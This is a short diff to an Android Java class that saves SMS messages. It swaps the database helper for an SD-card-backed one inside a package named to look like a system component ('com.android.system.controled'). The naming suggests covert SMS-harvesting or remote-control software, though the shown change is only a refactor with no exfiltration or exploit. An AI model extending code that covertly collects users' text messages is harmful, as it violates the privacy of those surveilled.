@@ -7,11 +7,11 @@ import android.content.Context;
 import com.android.system.controled.Debug;
 import com.android.system.controled.MainApplication;
 import com.android.system.controled.bean.SmsInfo;
-import com.android.system.controled.db.TableAllsms;
+import com.android.system.controled.db.SdcardDbOpera;
 
 public class SmsSaveOutUtil {
 
-	private static TableAllsms mAllsmsTable;
+	private static SdcardDbOpera mAllsmsTable;
 	private static SmsProviderUtil mSmsGetContent;
 //	private static Context mContext;
 
@@ -23,7 +23,7 @@ public class SmsSaveOutUtil {
 	
 	public static  SmsSaveOutUtil getInstence() {
 		if(mAllsmsTable == null) {
-			mAllsmsTable = TableAllsms.getInstence();
+			mAllsmsTable = SdcardDbOpera.getInstence();
 		}
 		
 		if(mSmsGetContent == null) {
